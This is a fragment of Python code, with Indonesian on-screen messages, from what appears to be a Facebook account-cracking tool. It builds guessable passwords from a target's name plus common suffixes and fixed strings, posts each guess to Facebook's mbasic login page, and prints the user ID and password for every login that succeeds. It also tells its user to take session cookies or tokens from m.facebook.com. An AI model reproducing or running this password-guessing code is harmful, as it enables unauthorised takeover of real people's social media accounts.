...
def login():
	...
	try:
		...
		print(" "+N+"\n [!] Diusahkan saat mengambil Cookies/Token gunakan: \n    m.facebook.com")
...
def indo():
	...
	print("\n "+N+"[!] Default password : name123,name1234,name12345,sayang")
...
def celek():
	...
	print("\n "+N+"[!] Menggunakan 11sandi proses lambat")
	print(" "+N+"-----------------------------------------------")
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),name.lower()+'786',name.lower()+'321','786786','102030','111222','445566','000786']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK] '+N+'' +uid+ '|' + pw + '       ')
